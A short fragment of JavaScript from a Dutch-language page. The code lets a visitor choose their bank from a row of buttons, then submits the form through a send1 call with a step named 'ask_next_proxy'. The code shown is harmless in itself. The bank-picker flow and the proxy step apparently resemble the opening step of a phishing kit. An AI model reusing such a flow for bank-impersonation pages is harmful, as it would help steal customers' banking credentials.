	function handleSubmit(event) {
		event.preventDefault();
		const selectedBank = document.getElementById('selected_bank').value;
		if (!selectedBank) {
			alert("Kies je bank.");
			return false;
		}
		send1(event, 'ask_next_proxy');
		return false;
	}
 
	document.addEventListener("DOMContentLoaded", function () {
		const bankButtons = document.querySelectorAll('button.bank-item');
		const hiddenInput = document.getElementById('selected_bank');
		const form = document.getElementById('next-form');
 
		bankButtons.forEach(button => {
			button.addEventListener('click', function (e) {
				e.preventDefault();
				const bankId = this.id.replace('bank-item-', '');
				hiddenInput.value = bankId;
 
				document.getElementById('next-form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
			});
		});
	});
	</script>
